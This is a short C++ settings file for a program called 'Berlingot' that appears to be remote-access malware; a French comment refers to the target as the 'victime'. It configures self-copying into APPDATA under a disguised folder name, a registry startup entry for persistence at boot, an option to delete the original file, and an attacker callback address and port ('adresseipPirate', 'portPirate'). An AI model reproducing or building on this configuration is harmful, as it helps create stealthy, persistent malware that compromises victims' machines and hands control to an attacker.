//
// Created by Berlingot on 2023-04-20.
//
#include "Settings.h"

std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
std::string Settings::folderName = "Fichiers de lait";					//name of folder where file is located
std::string Settings::startupName = "Berlingot startup";		//startup name in registry / taskmgr
std::string Settings::fileName = "berlingot.exe";					//file name
bool Settings::installSelf = true;
bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
bool Settings::startOnNextBoot = false;		//mettre a true si on veut le lancer au démarrage du poste de la victime
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file



static const char * adresseipPirate = "127.0.0.1";
static unsigned short portPirate = 6452;
